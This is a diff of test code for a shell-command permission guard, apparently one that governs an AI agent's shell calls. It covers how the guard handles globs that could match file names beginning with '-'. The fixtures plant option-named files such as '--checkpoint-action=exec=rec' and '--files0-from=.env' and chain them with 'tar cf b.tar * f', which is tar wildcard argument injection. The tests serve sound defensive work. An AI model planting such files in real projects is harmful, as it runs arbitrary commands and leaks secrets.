+  expectN3b("N3b-6", "dashed", "classify", ["cd \"$d\" && ls -l -*", "cd \"$d\" && echo --to*"], /is a glob that can match a name that begins with -, in a place the check cannot tell/);
+  // optionGlob: each alternative of braces on its own, the first segment, the lead.
+  expectN3b("N3b-6", "dashed", "ask", ["ls {x*,-*}", "ls -d/*", "ls [-]d/x", "echo -d/$y*", "bash -c 'ls {s*/a.ts,-d/*}'", "echo [[=-=]]o"], /which (ls|echo) would read as an option/);
+  // (Braces reach the checks as written only in the code of a nested shell.)
+  expectN3b("N3b-6", "plain", "ask", ["bash -c 'touch ./{a,--zz}'", "bash -c 'mkdir -p ./{--zz,q}/x'", "touch -- --zz a"], /named like an option \(--zz\)/);
+  // The programs that make directories on the way, without the option that makes them.
+  expectN3b("N3b-6", "plain", "allow", ["mkdir new/--zz/x", "install f new/--zz/x", "curl -o new/--zz/x https://example.invalid/x", "cp f new/--zz/y"]);
+  expectN3b("N3b-6", "plain", "classify", ["sed -ei/x*/d f"]);
+  expectN3b("N3b-6", "dashed", "allow", ["ls {-l,src/a*}", "sort -o out.txt f", "echo -q/\"$y\"*", "echo s\"$y\"*", "echo --zq\"$x\"*", "echo '--to$x'*", "ls -l /tmp/n3b-nosuch-*", "ls {src/[[=a=]]*,x}", "echo \"`ls src/*.ts`\"", "echo \"$(ls src/*.ts)\""]);
+  // (N3d-3: unquoted, an expansion bash splits and globs, judged as `*` is: an ask here.)
+  expectN3b("N3b-6", "dashed", "ask", ["echo -q/$y*", "echo s$y*", "echo --zq$x*", "echo `ls src/*.ts`", "echo $(ls src/*.ts)"], /holds an expansion that bash splits and globs, which can match -\S*, a name here that \S+ would read as an option/);
+  // A name as bash spells it: a link named like an option is one, wherever it leads.
+  expectN3b("N3b-6", "link", "ask", ["tar xf a.tar --u*", "ls *", "ls -[l]/a.ts", "ls */a.ts"], /which (tar|ls) would read as an option/);
+  test("r4 N3b-6: a write target by its whole path: there already, or not", async () => {
+    const dir = n3bTree("dashed");
+    const there = await decideShell(guard, new SessionState(dir), dir, `echo x >> ${dir}/-o`);
+    assert.equal(kind(there), "allow", there.reason);
+    const made = await decideShell(guard, new SessionState(dir), dir, `touch ${dir}/--zz`);
+    assert.match(made.reason, /makes a file named like an option \(--zz\)/);
+    const walked = await decideShell(guard, new SessionState(dir), dir, `tar cf ${dir}/--x.tar f`);
+    assert.match(walked.reason, /(would make a file or directory|makes a file) named like an option \(--x\.tar\)/);
+  });
+  test("r4 N3b-6: a directory that cannot be listed is a place the check cannot tell", async () => {
+    const dir = n3bTree("link");
+    const locked = fs.mkdtempSync(path.join(tmp, "n3b-locked-"));
+    fs.chmodSync(locked, 0o311);
+    try {
+      const d = await decideShell(guard, new SessionState(dir), dir, `cd ${locked} && echo -$y*`);
+      assert.equal(kind(d), "classify", `${d.effect} by ${d.by}: ${d.reason}`);
+      assert.match(d.reason, /is a glob that can match a name that begins with -, in a place the check cannot tell/);
+    } finally {
+      fs.chmodSync(locked, 0o755);
+    }
+  });
+});
+
+// ---- Round 4, N3c: a glob in a call that may change the tree first goes to the model ----
+// The maintainer's rule: in a call where another command may write files, a word whose glob
+// could match a name that begins with `-` is not decided by rule. More trees: "n3c" holds the
+// sources the making commands take option-named names from, none of them at the top (`tpl/`,
+// `dash.tar`, a branch `other`, `mk.sh`, a make target `gen`, `names.txt`); "linked" is the
+// reading's finding 2 (`link` -> `sub/deep`, the option-named files at the top, none in `sub`);
+// "gitprog" names a project program for git's diff, textconv and clean filter.
+const N3C_DASHED = ["--checkpoint=1", "--checkpoint-action=exec=rec"];
+const n3cTrees = new Map<string, string>();
+const n3cMake = (tree: "n3c" | "linked" | "gitprog") => {
+  const dir = b3Project();
+  const g = (...args: string[]) => execFileSync("git", ["-C", dir, "-c", "user.name=t", "-c", "user.email=t@t", ...args], { stdio: ["ignore", "pipe", "pipe"] });
+  const file = (rel: string, text = "") => fs.writeFileSync(path.join(dir, rel), text);
+  file("x", "x\n");
+  file("src/a.ts", "x\n");
+  execFileSync("tar", ["-cf", "a.tar", "x"], { cwd: dir });
+  if (tree === "n3c") {
+    fs.mkdirSync(path.join(dir, "tpl"));
+    for (const n of [...N3C_DASHED, "--files0-from=.env"]) file(`tpl/${n}`);
+    const stage = fs.mkdtempSync(path.join(tmp, "n3c-stage-"));
+    for (const n of N3C_DASHED) fs.writeFileSync(path.join(stage, n), "");
+    execFileSync("tar", ["-cf", path.join(dir, "dash.tar"), "--", ...N3C_DASHED], { cwd: stage });
+    file("mk.sh", "touch ./--checkpoint=1 ./--checkpoint-action=exec=rec\n");
+    file("Makefile", "all:\n\t@true\ngen:\n\ttouch ./--checkpoint=1 ./--checkpoint-action=exec=rec\n");
+    file("names.txt", `${N3C_DASHED.join("\n")}\n`);
+    file("mk.py", `import pathlib\nfor n in ${JSON.stringify(N3C_DASHED)}:\n    pathlib.Path(n).touch()\n`);
+    file("mk.js", `for (const n of ${JSON.stringify(N3C_DASHED)}) require("fs").writeFileSync(n, "");\n`);
+    g("add", ".");
+    g("commit", "-qm", "sources");
+    g("checkout", "-qb", "other");
+    for (const n of N3C_DASHED) file(n);
+    g("add", "--", ...N3C_DASHED);
+    g("commit", "-qm", "dashed");
+    g("checkout", "-q", "main");
+  }
+  if (tree === "linked") {
+    fs.mkdirSync(path.join(dir, "sub", "deep"));
+    fs.symlinkSync("sub/deep", path.join(dir, "link"));
+    for (const n of N3C_DASHED) file(n);
+  }
+  if (tree === "gitprog") {
+    file("tool.sh", "#!/bin/sh\ntouch ./--checkpoint=1\n");
+    file(".gitattributes", "*.txt diff=t filter=t\n");
+    for (const [k, v] of [["diff.external", "./tool.sh"], ["diff.t.textconv", "./tool.sh"], ["filter.t.clean", "./tool.sh"]]) g("config", k, v);
+  }
+  return dir;
+};
+const n3cTree = (tree: "n3c" | "linked" | "gitprog") => {
+  if (!n3cTrees.has(tree)) n3cTrees.set(tree, n3cMake(tree));
+  return n3cTrees.get(tree)!;
+};
+type N3cTree = "plain" | "dashed" | "n3c" | "linked" | "gitprog";
+const expectN3c = (id: string, tree: N3cTree, want: Want | Want[], commands: string[], reason?: RegExp) => {
+  for (const c of commands) test(`r4 ${id}: ${tree}: ${Array.isArray(want) ? want.join(" or ") : want}: ${JSON.stringify(c)}`, async () => {
+    const dir = tree === "plain" || tree === "dashed" ? n3Project(tree === "dashed") : n3cTree(tree);
+    const d = await decideShell(guard, new SessionState(dir), dir, c);
+    const wants = Array.isArray(want) ? want : [want];
+    assert.ok(wants.includes(kind(d)), `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
+    if (reason) assert.match(d.reason, reason, c);
+  });
+};
+// The model's, by this rule, naming the word.
+const BESIDE = (word: string) => new RegExp(`(^|\\()${word.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} is a glob that can match a name that begins with -, and another command of the call \\(.*\\) may make such a name before bash expands it`);
+const GLOBBED = /is a glob that can match a name that begins with -, and another command of the call/;
+
+describe("r4 N3c-1: a glob that can match a name beginning with - beside a command that may write", () => {
+  // Each kind of first character: a glob character, `-`, an expansion; before or after the writer.
+  for (const [c, word] of [
+    ["make && ls *.so", "*.so"],
+    ["npm test && cat *.log", "*.log"],
+    ["touch a && ls *", "*"],
+    ["ls * && make", "*"],
+    ["make && ls ?x", "?x"],
+    ["make && ls [a-z]*", "[a-z]*"],
+    ["make && ls --to*", "--to*"],
+    ["make && ls -[x]y", "-[x]y"],
+    ["make && ls */x", "*/x"],
+    ["make && echo $y*", "$y*"],
+    ["make && ls \"$d\"*", "$d*"],
+    ["make && ls ${d}x/*", "${d}x/*"],
+  ] as const) expectN3c("N3c-1", "plain", "classify", [c], BESIDE(word));
+  // A first part that is a plain name not beginning with `-` cannot match such a name.
+  expectN3c("N3c-1", "plain", "allow", ["make && ls src/*", "make && ls ./*.so", "make && ls a*", "make && ls x/[ab]*", "make && ls /tmp/n3c-nosuch-*"]);
+  // The existing asks stay in front: a glob that matches a dash-named file that is there asks.
+  expectN3c("N3c-1", "dashed", "ask", ["make && ls *", "make && ls -*"], /matches -\S*, which ls would read as an option/);
+});
+
+describe("r4 N3c-2: only a glob bash expands counts", () => {
+  // Quoted or escaped: never expanded.
+  expectN3c("N3c-2", "plain", "allow", [
+    "npm run build && find . -name '*.js'",
+    "make && grep -r --include='*.c' x src",
+    "git add . && git ls-files '*.md'",
+    "git add . && git ls-files \"*.md\"",
+    "make && rg -g '*.ts' x",
+    "make && awk -F'[,;]' '{print $1}' f",
+    "make && ls \\*.so",
+    "make && ls \"*\".so",
+    "make && echo \"$y*\"",
+    "make && echo \"-*\"",
+    "make && echo '--to'\\*",
+  ]);
+  // Unquoted, also beside quoted text.
+  expectN3c("N3c-2", "plain", "classify", ["make && grep -r --include=*.c x src", "make && ls \"-\"*", "make && echo '--to'*", "make && find . -name *.js"], GLOBBED);
+  // A glob inside an expansion is the expansion's (`$?`, `${x#*/}`, `$*`): not a glob of the word.
+  // (N3d-3: `${y#*/}` is an unquoted expansion, which now counts as a glob of unknown value.)
+  expectN3c("N3c-2", "plain", "allow", ["make && echo $?", "make && echo \"$*\"", "make && echo $*"]);
+  // The same knowledge makes the old ask exact: a quoted pattern beside a file named `-o` asks no more.
+  expectN3c("N3c-2", "dashed", "allow", ["echo '-*'", "echo \"-*\"", "grep -e '-*' f", "echo -\\*"]);
+  expectN3c("N3c-2", "dashed", "ask", ["echo -*", "echo \"-\"*"], /matches -\S*, which echo would read as an option/);
+});
+
+describe("r4 N3c-3: what it closes", () => {
+  // The reading's findings 1 to 3 (REVIEW-N3b-SOL).
+  expectN3c("N3c-3", "n3c", ["ask", "classify"], [
+    "tar -cf--checkpoint=1 f && tar -cf--checkpoint-action=exec=rec f && tar cf b.tar * f",
+    "mkdir new && tar cf new/../--checkpoint=1 f && tar cf new/../--checkpoint-action=exec=rec f && tar cf b.tar * f",
+    "python3 -m venv new/../--files0-from=.env/x && wc --f*",
+    "python3 -m venv new/../--checkpoint=1 && python3 -m venv new/../--checkpoint-action=exec=rec && tar cf b.tar * f",
+  ]);
+  expectN3c("N3c-3", "linked", ["ask", "classify"], ["tar cf link/../--checkpoint=1 f && tar cf link/../--checkpoint-action=exec=rec f && cd sub && tar cf ../b.tar * f"]);
+  // Making commands the checks do not see, before, after or beside the glob (all rule allows before).
+  expectN3c("N3c-3", "n3c", "classify", [
+    "tar xf dash.tar && tar cf b.tar * f",
+    "cp -r tpl/. . && tar cf b.tar * f",
+    "cp -a tpl/. ./ && wc --f*",
+    "git checkout other && tar cf b.tar * f",
+    "cp tpl/* . && tar cf b.tar * f",
+    // (B9-6: the archive these tars make is a write of the call, which sends the program before
+    // them to the model on its own: they make it in /dev/null, which no program runs.)
+    "sh mk.sh && tar cf /dev/null * f",
+    "bash mk.sh; tar cf /dev/null * f",
+    "make gen && tar cf /dev/null * f",
+    "tar xf dash.tar & wait; tar cf b.tar * f",
+    "x=$(tar xf dash.tar); tar cf b.tar * f",
+    "tar xf dash.tar -C sub && cd sub && tar cf ../b.tar * ../f",
+    "tar cf b.tar * f; tar xf dash.tar",
+    "tar xf dash.tar | tar cf b.tar * f",
+    "if tar xf dash.tar; then tar cf b.tar * f; fi",
+    "cat dash.tar | tar x && tar cf b.tar ./f *",
+    "tar xf dash.tar && tar cf b.tar ?* f",
+    "tar xf dash.tar && tar cf b.tar [-]* f",
+    "tar xf dash.tar && tar cf b.tar --check* f",
+  ], GLOBBED);
+  // More of the second run's own (each run in bash: xcheck/n3c/bash/): scripts, git's other ways
+  // to bring files in, a group, a subshell, wrappers, a process substitution, a heredoc's
+  // substitution, a loop, a reader between, another program that takes the name as an option.
+  expectN3c("N3c-3", "n3c", "classify", [
+    "node mk.js && tar cf /dev/null * f",
+    "python3 mk.py && tar cf /dev/null * f",
+    "git switch other && tar cf b.tar * f",
+    "git merge -q other && tar cf /dev/null * f",
+    "git cherry-pick other && tar cf /dev/null * f",
+    "{ tar xf dash.tar; } && tar cf b.tar * f",
+    "(tar xf dash.tar) && tar cf b.tar * f",
+    "cat <(tar xf dash.tar) && tar cf b.tar * f",
+    "while true; do tar xf dash.tar; break; done; tar cf b.tar * f",
+    "time tar xf dash.tar && tar cf b.tar * f",
+    "timeout 5 tar xf dash.tar && tar cf b.tar * f",
+    "nice make gen && tar cf /dev/null * f",
+    "cat <<EOF && tar cf b.tar * f\n$(tar xf dash.tar)\nEOF",
+    "tar xf dash.tar; ls; tar cf b.tar * f",
+    "cp -r tpl/. . && wc -l *",
+    "git checkout other && wc -l *",
+  ], GLOBBED);
+  expectN3c("N3c-3", "n3c", ["ask", "classify"], ["tar xf dash.tar && echo * | xargs tar cf b.tar", "g() { tar cf b.tar * f; }; tar xf dash.tar; g"]);
+  // B9-6: an archive named like an option is a file the call makes: it asks for that first.
+  expectN3c("N3c-3", "n3c", "ask", ["tar -cf--to-command=rec f && tar xf a.tar --to*", "for i in 1 2; do tar cf b.tar * f; tar -cf--checkpoint=1 f; tar -cf--checkpoint-action=exec=rec f; done"], /makes a file named like an option/);
+  // The same forms the model had already (a function, a substitution, a nested shell, a script on
+  // a pipe, a name read at run time), and two that asked: still not allows.
+  expectN3c("N3c-3", "n3c", ["ask", "classify"], [
+    "f() { tar xf dash.tar; }; f; tar cf b.tar * f",
+    "tar cf b.tar $(tar xf dash.tar) * f",
+    "bash -c 'tar xf dash.tar' && tar cf b.tar * f",
+    "git show other:mk.sh | sh && tar cf b.tar * f",
+    "while read n; do tar -cf\"$n\" f; done < names.txt; tar cf b.tar * f",
+    "tar xf dash.tar && x= && tar cf b.tar $x* f",
+    "python3 -m venv --without-pip new/../--to-command=rec && tar xf a.tar --to*",
+    "go build -o new/../--to-command=rec . && tar xf a.tar --to*",
+    "git checkout other -- . && tar cf b.tar * f",
+    "git archive -o--checkpoint=1 HEAD f && git archive -o--checkpoint-action=exec=rec HEAD f && tar cf b.tar * f",
+  ]);
+  // Across two calls: the making call is an allow, and the glob in the next call is judged by the
+  // tree as it then stands: an ask.
+  for (const make of ["tar xf dash.tar", "git checkout -q other", "tar -cf--checkpoint=1 f && tar -cf--checkpoint-action=exec=rec f"]) {
+    test(`r4 N3c-3: across two calls: ${JSON.stringify(make)} then "tar cf b.tar * f" asks`, async () => {
+      const dir = n3cMake("n3c");
+      const s = new SessionState(dir);
+      const first = await decideShell(guard, s, dir, make);
+      // (B9-6: tar's archives named like options ask in the making call already; approved here.)
+      assert.equal(kind(first), make.startsWith("tar -cf--") ? "ask" : "allow", `${make}: ${first.reason}`);
+      first.approve?.();
+      execFileSync("bash", ["-c", make], { cwd: dir, stdio: "ignore" });
+      const next = await decideShell(guard, s, dir, "tar cf b.tar * f");
+      assert.equal(kind(next), "ask", next.reason);
+      assert.match(next.reason, /\* matches --checkpoint.*, which tar would read as an option/);
+    });
+  }
+});
+
+describe("r4 N3c-4: what it leaves alone, and what changes", () => {
+  // A single command with a glob; calls of readers only; a glob whose first part is a plain name;
+  // a quoted pattern; a glob behind `--`.
+  expectN3c("N3c-4", "plain", "allow", [
+    "ls *",
+    "rm -f *.log",
+    "wc -l *.md",
+    "tar cf b.tar *",
+    "git add *",
+    "cd src && ls *.ts",
+    "git status && ls *",
+    "grep -c foo *.md | sort",
+    "mkdir -p out && cp src/*.js out/",
+    "npm run build && ls dist/*",
+    "make && ls ./*.so",
+    "npm run build && find . -name '*.js'",
+    "make && grep -r --include='*.c' x src",
+    "git add . && git ls-files '*.md'",
+    "make && ls -- *.so",
+  ]);
+  // As the decision says: the model.
+  expectN3c("N3c-4", "plain", "classify", ["make && ls *.so", "npm test && cat *.log", "touch a && ls *"], GLOBBED);
+});
+
+describe("r4 N3c-6: each line of the rule", () => {
+  // The glob's own command does not count against itself; its own redirect neither.
+  expectN3c("N3c-6", "plain", "allow", ["tar cf b.tar * && cat f", "ls * > list.txt", "ls * > list.txt && cat list.txt"]);
+  // `--`: for a program on the list, a word behind it is a name; the word before `--` must not be
+  // able to take it as its value.
+  expectN3c("N3c-6", "plain", "allow", ["make && ls -l -- *", "make && ls --color=auto -- *", "make && cat -- *", "make && wc -l -- *.c", "make && grep -e x -- *", "make && git add -- *.c", "make && git log -- *.c", "make && head -5 -- *", "make && rm -f -- *.o", "make && du -sh -- *"]);
+  // Every other program on the list, and the value letters of two more.
+  expectN3c("N3c-6", "plain", "allow", ["make && tail -- *", "make && egrep x -- *", "make && fgrep x -- *", "make && rg x -- *", "make && stat -- *", "make && sort -- *", "make && touch -- *", "make && chmod 644 -- *", "make && mkdir -- *", "make && ls -w 80 -- *"]);
+  // (N3d-2: `cut -c1 -- *` and `head -n5 -- *` go to the model: a letter that takes a value is
+  // not on the list, with its value attached or not.)
+  expectN3c("N3c-6", "plain", "classify", ["make && ls -w -- *", "make && head -c -- *", "make && touch x* -- *"], GLOBBED);
+  expectN3c("N3c-6", "plain", "classify", ["make && echo -- *", "make && find -- *", "make && test -- *", "make && ls *.so --", "make && ls -I -- *", "make && grep -e -- *", "make && ls --color -- *", "make && git grep -e -- *", "make && tail -n -- *"], GLOBBED);
+  // (git with `--` before its subcommand asks already.)
+  expectN3c("N3c-6", "plain", "ask", ["make && git -- *"]);
+  // What writes nothing, group by group.
+  // The shell's builtins that change no file, keywords, loops, a lone assignment.
+  expectN3c("N3c-6", "plain", "allow", ["cd src && ls *", "echo hi && ls *", "printf x && ls *", "true && ls *", "test -f f && ls *", "[ -f f ] && ls *", ": && ls *", "pwd; ls *", "read x < f; ls *", "type ls && ls *", "command -v ls && ls *", "if test -f f; then ls *; fi", "for f in *; do echo \"$f\"; done", "x=1; ls *", "set -e; ls *", "while false; do :; done; ls *", "exit 0; ls *"]);
+  // Readers.
+  expectN3c("N3c-6", "plain", "allow", ["cat f && ls *", "head -1 f && ls *", "tail -1 f && ls *", "wc -l f && ls *", "grep x f && ls *", "egrep x f && ls *", "fgrep x f && ls *", "rg x f && ls *", "stat f && ls *", "du -sh src && ls *", "file f && ls *", "diff f notes.txt; ls *", "cmp f notes.txt; ls *", "sort f && ls *", "cut -c1 f && ls *", "tr a b < f && ls *", "basename f && ls *", "dirname f && ls *", "realpath f && ls *", "readlink f; ls *", "find . -name f && ls *", "ls && ls *"]);
+  // ... and their forms that write or run.
+  expectN3c("N3c-6", "plain", ["classify", "ask"], ["sort -o out.txt f && ls *", "sort -uo out.txt f && ls *", "sort --output=out.txt f && ls *", "sort --compress-program=gzip f && ls *", "find . -name nosuch -delete && ls *", "find . -name nosuch -fprint out.txt && ls *", "file -C -m f && ls *", "rg --pre=cat x f && ls *", "command touch a && ls *"]);
+  // git: subcommands that write nothing in the work tree, and their forms that do.
+  expectN3c("N3c-6", "plain", "allow", ["git status && ls *", "git log --oneline && ls *", "git diff && ls *", "git show && ls *", "git rev-parse HEAD && ls *", "git ls-files && ls *", "git -C src ls-files && ls *", "git blame f && ls *", "git grep x && ls *", "git cat-file -p HEAD && ls *"]);
+  expectN3c("N3c-6", "plain", ["classify", "ask"], ["git diff --output=out.txt && ls *", "git log -p --output=out.txt && ls *", "git checkout main && ls *", "git stash && ls *", "git grep -O x && ls *", "git grep --open-files-in-pager x && ls *", "git add . && ls *"]);
+  // Where the repository's configuration names a program of the project for a diff, a filter or
+  // fsmonitor, those subcommands may run it.
+  expectN3c("N3c-6", "gitprog", "classify", ["git diff && ls *", "git status && ls *", "git log -p && ls *", "git ls-files -m && ls *", "git ls-files && ls *"], GLOBBED);
+  // (N3d-5: `rev-parse` and `rev-list` read the index in some forms, and are held to it too.)
+  expectN3c("N3c-6", "gitprog", "classify", ["git rev-parse HEAD && ls *"], GLOBBED);
+  expectN3c("N3c-6", "gitprog", "allow", ["git ls-tree HEAD && ls *"]);
+  // A redirect to a file is a write; to /dev/null it is not.
+  expectN3c("N3c-6", "plain", "classify", ["cat f > out.txt && ls *", "echo x >> notes.txt && ls *", "ls >list.txt; ls *"], GLOBBED);
+  expectN3c("N3c-6", "plain", "allow", ["cat f > /dev/null && ls *", "grep x f 2>/dev/null && ls *"]);
+  // Any other command may write: wherever it stands, at any depth.
+  expectN3c("N3c-6", "plain", ["classify", "ask"], ["ls * && echo $(make)", "{ make; } && ls *", "( make ) && ls *", "bash -c 'make' && ls *", "ls * | xargs echo", "env ls && ls *", "timeout 5 ls && ls *", "./x && ls *"]);
+});
+
+// The lists and the reading, line by line, on the helpers themselves: some lines are held in a
+// call by an earlier check that asks first (`git -c`, `git grep -O`, `sort --compress-program`,
+// `rg --hostname-bin`, an assignment to PATH, a nested shell beside an expansion), and the
+// reading that does not line up cannot be reached from a call that the printer prints.
+describe("r4 N3c-6: the helpers, line by line", () => {
+  const { writesNothing, behindDashDash, optionLedGlob, markExpansions } = guardModule as unknown as {
+    writesNothing: (cmd: { argv: string[]; out: string[] }, gitQuiet?: () => boolean) => boolean;
+    behindDashDash: (argv: string[], marked: string[] | undefined, p: number, k: number) => boolean;
+    optionLedGlob: (word: string, marked: string | undefined) => boolean;
+    markExpansions: (s: string, depth?: number, globs?: boolean) => string;
+  };
+  const cmd = (text: string, out: string[] = []) => ({ argv: text ? text.split(" ") : [], out });
+  const yes = () => true;
+  const no = () => false;
+  const quiet = (texts: string[], git = no) => {
+    for (const t of texts) assert.equal(writesNothing(cmd(t), git), true, t);
+  };
+  const writes = (texts: string[], git = yes) => {
+    for (const t of texts) assert.equal(writesNothing(cmd(t), git), false, t);
+  };
+  test("r4 N3c-6: unit: builtins, keywords, assignments, loop and case headers write nothing", () => {
+    quiet(["cd src", "pushd src", "popd", "dirs", "pwd", "echo x", "printf x", "true", "false", ":", "test -f f", "[ -f f ]", "read x", "type ls", "set -e", "exit 0", "return 1", "break", "continue", "shift", "wait", "x=1", "x=1 y=2", "x=1 ls", "if true", "then cat f", "elif true", "else true", "do ls", "while true", "until false", "! true", "time ls", "{ ls", "}", "fi", "done", "esac", "} ls", "for f in *", "select x in a b", "case x in", "command -v ls", "command -V ls", ""]);
+  });
+  test("r4 N3c-6: unit: anything else may write", () => {
+    writes(["make", "touch a", "x=1 make", "PATH=/x", "PATH=/x ls", "x=1 PATH=/x ls", "export x=1", "declare x=1", "command touch a", "command ls", "command", "env ls", "./ls", "/bin/ls", "source x", ". x", "mapfile x", "hash -p ./x ls", "xargs ls", "nice ls", "timeout 5 ls", "ls2", "if make", "do make"]);
+  });
+  test("r4 N3c-6: unit: a shell handed code is its code's commands", () => {
+    quiet(["bash -c ls", "sh -c ls", "dash -c ls", "bash -ec ls", "bash -c ls x y", "eval ls", "eval make"]);
+    writes(["bash -c", "bash x.sh", "sh", "zsh -c ls", "ksh -c ls", "bash -x -c ls", "bash --rcfile x -c ls"]);
+  });
+  test("r4 N3c-6: unit: readers write nothing", () => {
+    quiet(["ls", "ls -la src", "cat f", "head -1 f", "tail -f f", "wc -l f", "grep -r x .", "egrep x f", "fgrep x f", "rg x f", "rg --pre-glob *.gz x f", "stat f", "du -sh .", "file f", "file -m x f", "file -mC f", "diff a b", "cmp a b", "sort f", "sort -ko f", "sort -to f", "sort -u f", "sort --unique f", "cut -c1 f", "tr a b", "basename f", "dirname f", "realpath f", "readlink f", "find . -name x -print", "jq . f", "jq -r .a f"]);
+  });
+  test("r4 N3c-6: unit: the readers' options that write or run", () => {
+    writes(["sort -o x f", "sort -uo x f", "sort -ox f", "sort --output=x f", "sort --out x f", "sort --compress-program=gzip f", "sort --comp=gzip f"]);
+    writes(["find . -delete", "find . -exec rm {} ;", "find . -execdir rm {} ;", "find . -ok rm {} ;", "find . -okdir rm {} ;", "find . -fprint x", "find . -fprint0 x", "find . -fprintf x %p", "find . -fls x"]);
+    writes(["file -C", "file -bC", "file --compile", "file --comp"]);
+    writes(["rg --pre x f", "rg --pre=cat x f", "rg --hostname-bin=x x f", "rg --hostname-bin x x f"]);
+    const was = process.env.RIPGREP_CONFIG_PATH;
+    process.env.RIPGREP_CONFIG_PATH = "/nonexistent";
+    try {
+      writes(["rg x f"]);
+    } finally {
+      if (was === undefined) delete process.env.RIPGREP_CONFIG_PATH;
+      else process.env.RIPGREP_CONFIG_PATH = was;
+    }
+  });
+  test("r4 N3c-6: unit: a redirect to a file is a write", () => {
+    assert.equal(writesNothing(cmd("cat f", ["out.txt"]), no), false);
+    assert.equal(writesNothing(cmd("", ["out.txt"]), no), false);
+    assert.equal(writesNothing(cmd("}", ["out.txt"]), no), false);
+    for (const t of ["/dev/null", "/dev/stdout", "/dev/stderr"]) assert.equal(writesNothing(cmd("cat f", [t]), no), true, t);
+    assert.equal(writesNothing(cmd("cat f", ["/dev/null", "o"]), no), false);
+  });
+  test("r4 N3c-6: unit: git's subcommands that write nothing in the work tree", () => {
+    quiet(["git ls-tree HEAD", "git merge-base a b", "git show-ref", "git for-each-ref", "git count-objects", "git -C src ls-tree HEAD", "git --no-pager ls-tree HEAD", "git branch", "git branch -a", "git branch -vv", "git branch --show-current", "git branch --list"]);
+    // Those that may run a filter, a diff program or core.fsmonitor (whatever reads the index,
+    // B8-2): as the configuration says.
+    // (N3d-5: and `rev-parse`, `rev-list`, which read the index in some forms: `:f`, `--indexed-objects`.)
+    for (const t of ["git rev-parse HEAD", "git rev-parse :f", "git rev-list HEAD", "git rev-list --all --indexed-objects", "git -C src rev-parse HEAD", "git --no-pager rev-parse HEAD", "git ls-files", "git ls-files -s", "git ls-files -- x", "git cat-file -t HEAD", "git cat-file -p HEAD", "git status", "git diff", "git log", "git log -p", "git show", "git blame f", "git describe", "git shortlog", "git whatchanged", "git grep x", "git ls-files -m", "git cat-file --textconv HEAD:f", "git diff --ext-diff", "git log --textconv"]) {
+      assert.equal(writesNothing(cmd(t), yes), true, t);
+      assert.equal(writesNothing(cmd(t), no), false, t);
+      assert.equal(writesNothing(cmd(t)), false, t);
+    }
+    writes(["git", "git branch new", "git branch -d x", "git add .", "git checkout x", "git stash", "git config a b", "git tag v", "git -c a=b status", "git --git-dir=x status", "git diff --output=x", "git log --out=x", "git log --output-directory=x", "git grep -O x", "git grep -nO x", "git grep --open-files-in-pager=less x", "git grep --open x"]);
+  });
+  test("r4 N3c-6: unit: the programs that end their options at --, and their value letters", () => {
+    // (N3d-2: the table is now of the letters that take no value, each program's own: see
+    // "r4 N3d-6: unit: each program's letters that take no value". A letter that takes a value is
+    // not on it, with its value attached or not.)
+    const letters: Record<string, string> = { ls: "ITw", cat: "", head: "cn", tail: "cns", wc: "", grep: "ABCDdefm", egrep: "ABCDdefm", fgrep: "ABCDdefm", rg: "ABCEMTdefgjmrt", rm: "", cp: "St", mv: "St", ln: "St", du: "BXdt", stat: "c", sort: "STkot", cut: "bcdf", touch: "drt", chmod: "", mkdir: "m" };
+    for (const [name, values] of Object.entries(letters)) {
+      assert.equal(behindDashDash([name, "--", "*"], undefined, 0, 2), true, name);
+      for (const l of values) {
+        assert.equal(behindDashDash([name, `-${l}`, "--", "*"], undefined, 0, 3), false, `${name} -${l}`);
+        assert.equal(behindDashDash([name, `-${l}1`, "--", "*"], undefined, 0, 3), false, `${name} -${l}1`);
+      }
+    }
+    for (const name of ["echo", "test", "[", "find", "tar", "printf", "xargs", "env"]) assert.equal(behindDashDash([name, "--", "*"], undefined, 0, 2), false, name);
+    // git: after its subcommand.
+    assert.equal(behindDashDash(["git", "log", "--", "*"], undefined, 0, 3), true);
+    assert.equal(behindDashDash(["git", "-C", "src", "log", "--", "*"], undefined, 0, 5), true);
+    assert.equal(behindDashDash(["git", "grep", "-e", "--", "*"], undefined, 0, 4), false);
+    assert.equal(behindDashDash(["git", "--", "*"], undefined, 0, 2), false);
+    // A long option takes `--` as its value unless its own comes with `=`; an operand cannot.
+    assert.equal(behindDashDash(["ls", "--color", "--", "*"], undefined, 0, 3), false);
+    assert.equal(behindDashDash(["ls", "--color=auto", "--", "*"], undefined, 0, 3), true);
+    assert.equal(behindDashDash(["grep", "-e", "x", "--", "*"], undefined, 0, 4), true);
+    assert.equal(behindDashDash(["head", "-5", "--", "*"], undefined, 0, 3), true);
+    // The first `--` only; `--` after the word counts for nothing.
+    assert.equal(behindDashDash(["ls", "-I", "--", "--", "*"], undefined, 0, 4), false);
+    assert.equal(behindDashDash(["ls", "*", "--"], undefined, 0, 1), false);
+    // The word before `--` holds an expansion or a glob that could make such an option.
+    assert.equal(behindDashDash(["ls", "x$o", "--", "*"], undefined, 0, 3), false);
+    assert.equal(behindDashDash(["ls", "x*", "--", "*"], undefined, 0, 3), false);
+    assert.equal(behindDashDash(["ls", "x$o", "--", "*"], ["ls", "x\u000e$o", "--", "\u0010*"], 0, 3), false);
+    assert.equal(behindDashDash(["ls", "x*", "--", "*"], ["ls", "x\u0010*", "--", "\u0010*"], 0, 3), false);
+    assert.equal(behindDashDash(["ls", "x*", "--", "*"], ["ls", "x*", "--", "\u0010*"], 0, 3), true);
+    // (A program behind a wrapper: the word's own program.)
+    assert.equal(behindDashDash(["timeout", "5", "ls", "--", "*"], undefined, 2, 4), true);
+  });
+  test("r4 N3c-6: unit: a glob that can match a name that begins with -", () => {
+    // The marked reading: unquoted glob characters only, and the first character.
+    for (const [word, marked, want] of [
+      ["*.js", "\u0010*.js", true],
+      ["*.js", "*.js", false],
+      ["?x", "\u0010?x", true],
+      ["[ab]", "\u0010[ab]", true],
+      ["[", "\u0010[", false],
+      ["-*", "-\u0010*", true],
+      ["-*", "-*", false],
+      ["$y*", "\u000e$y\u0010*", true],
+      ["$d*", "\u000f$d\u0010*", true],
+      ["$y", "\u000e$y", false],
+      ["a*", "a\u0010*", false],
+      ["src/*", "src/\u0010*", false],
+      ["./*", "./\u0010*", false],
+      ["/tmp/*", "/tmp/\u0010*", false],
+      ["*/x", "\u0010*/x", true],
+    ] as const) assert.equal(optionLedGlob(word, marked), want, JSON.stringify(marked));
+    // Where the reading does not line up: every glob character counts, and every `$` and backtick.
